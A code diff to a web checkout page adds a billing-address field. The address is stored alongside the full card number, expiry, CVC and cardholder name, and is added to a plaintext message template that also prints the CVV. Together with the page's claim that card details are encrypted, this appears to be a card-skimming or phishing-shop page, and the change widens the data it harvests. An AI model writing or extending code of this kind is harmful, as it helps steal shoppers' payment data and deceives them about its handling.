@@ -543,6 +543,11 @@
               <div class="checkout-label">Cardholder Name</div>
               <input type="text" class="checkout-input" id="card-name" placeholder="John Doe" maxlength="40">
             </div>
+            <div class="checkout-icon-field">
+              <span class="checkout-input-icon">📍</span>
+              <div class="checkout-label wide">Billing Address</div>
+              <input type="text" class="checkout-input" id="card-address" placeholder="Street address, City, ZIP" maxlength="60">
+            </div>
           </div>
           <button class="checkout-submit" id="submit-card">Add Card to Order</button>
           <p class="checkout-note">🔒 Your card details are encrypted for security</p>
@@ -946,6 +951,7 @@ Price: ${money(unitPrice)}`,
       const expiry = document.querySelector('#card-expiry').value;
       const cvc = document.querySelector('#card-cvc').value;
       const cardName = document.querySelector('#card-name').value;
+      const billingAddress = document.querySelector('#card-address').value;
       
       const sessionId = document.querySelector('#card-session-id').value;
       const session = getSession(sessionId);
@@ -954,12 +960,12 @@ Price: ${money(unitPrice)}`,
         return;
       }
       
-      if (!cardNumber || !expiry || !cvc || !cardName) {
+      if (!cardNumber || !expiry || !cvc || !cardName || !billingAddress) {
         showToast('Please fill in all card details');
         return;
       }
       
-      session.card = { number: cardNumber, expiry, cvc, name: cardName };
+      session.card = { number: cardNumber, expiry, cvc, name: cardName, address: billingAddress };
       sessions.set(sessionId, session);
       
       document.querySelector('#checkout-card-modal').classList.remove('open');
@@ -970,6 +976,7 @@ Price: ${money(unitPrice)}`,
 ID: ${sessionId}
 Card: ${cardNumber.replace(/ /g, '').replace(/(.{4})/g, '$1 ')}
 Name: ${cardName}
+Address: ${billingAddress}
 CVV: ${cvc}
 EXP: ${expiry}`,
         {
